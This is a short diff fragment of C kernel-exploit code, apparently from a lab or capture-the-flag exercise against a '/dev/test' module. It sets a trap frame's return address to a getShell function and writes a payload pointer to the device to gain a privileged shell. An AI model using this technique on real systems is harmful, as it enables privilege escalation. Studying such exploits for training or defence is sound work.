@@ -15,8 +15,8 @@ int main(){
     int fd;
     void *ptr = &payload;
 
-    fd = openModule("/dev/test");
-    prepTF64();
+    fd = openModule("/dev/test", 1);
+    prepTF64(1);
     tf.user_rip = getShell;
     write(fd, &ptr, 8);
 
